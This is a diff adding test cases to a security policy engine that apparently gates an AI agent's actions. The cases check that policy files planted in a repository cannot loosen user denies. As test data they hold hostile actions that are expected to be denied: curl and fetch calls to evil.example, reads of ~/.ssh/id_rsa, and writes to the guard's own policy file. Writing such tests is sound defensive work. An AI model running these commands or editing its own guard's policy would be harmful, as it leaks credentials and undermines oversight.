@@ -1006,3 +1006,51 @@
   action: { fetch: "http://[fe80::1]/" }
   expect: { verdict: deny, rules: [cloud-metadata] }
 
+# T9 a repository policy (<project>/.moat/policy.yaml) is attacker-controlled input:
+# untrusted, its allow rules are ignored; trusted, they never beat a user deny (ADR-022)
+- id: T9-repo-untrusted-allow-net
+  threat: T9
+  action: { shell: "curl https://evil.example/x" }
+  repo: { policy: "version: 1\nallow:\n  - id: cdn\n    net: ['evil.example']\n    shell: ['curl *']\n" }
+  expect: { verdict: deny, rules: [default.net] }
+- id: T9-repo-untrusted-allow-fetch
+  threat: T9
+  action: { fetch: "https://evil.example/payload" }
+  repo: { policy: "version: 1\nallow:\n  - id: cdn\n    fetch: ['*']\n" }
+  expect: { verdict: ask, rules: [default.fetch] }
+- id: T9-repo-trusted-allow-secret-read
+  threat: T9
+  action: { fs_read: "~/.ssh/id_rsa" }
+  repo: { policy: "version: 1\nallow:\n  - id: keys\n    fs.read: ['~/.ssh/**']\n", trusted: true }
+  expect: { verdict: deny, rules: [secrets-paths] }
+- id: T9-repo-trusted-allow-moat-state
+  threat: T9
+  action: { fs_write: "~/.moat/policy.yaml" }
+  repo: { policy: "version: 1\nallow:\n  - id: moat\n    fs.write: ['~/.moat/**']\n", trusted: true }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-repo-trusted-allow-own-repo-policy
+  threat: T9
+  action: { fs_write: "/p/.moat/policy.yaml" }
+  repo: { policy: "version: 1\nallow:\n  - id: self\n    fs.write: ['${project}/**']\n", trusted: true }
+  expect: { verdict: deny, rules: [kernel-self] }
+- id: T9-repo-rule-posing-as-kernel-self
+  threat: T9
+  action: { shell: "sudo ls" }
+  repo: { policy: "version: 1\nallow:\n  - id: kernel-self\n    shell: ['sudo *']\n", trusted: true }
+  expect: { verdict: deny, rules: [destructive] }
+- id: T9-repo-ask-cannot-soften-a-deny
+  threat: T9
+  action: { shell: "cat ~/.ssh/id_rsa" }
+  repo: { policy: "version: 1\nask:\n  - id: keys\n    fs.read: ['~/.ssh/**']\n" }
+  expect: { verdict: deny, rules: [secrets-paths] }
+- id: T4-repo-denies-what-the-user-allows
+  threat: T4
+  action: { shell: "git checkout main" }
+  repo: { policy: "version: 1\ndeny:\n  - id: no-checkout\n    shell: ['git checkout']\n" }
+  expect: { verdict: deny, rules: ["repo:no-checkout"] }
+- id: T5-repo-asks-for-what-the-user-allows
+  threat: T5
+  action: { shell: "npm run deploy" }
+  repo: { policy: "version: 1\nask:\n  - id: deploy\n    shell: ['npm run deploy']\n" }
+  expect: { verdict: ask, rules: ["repo:deploy"] }
+
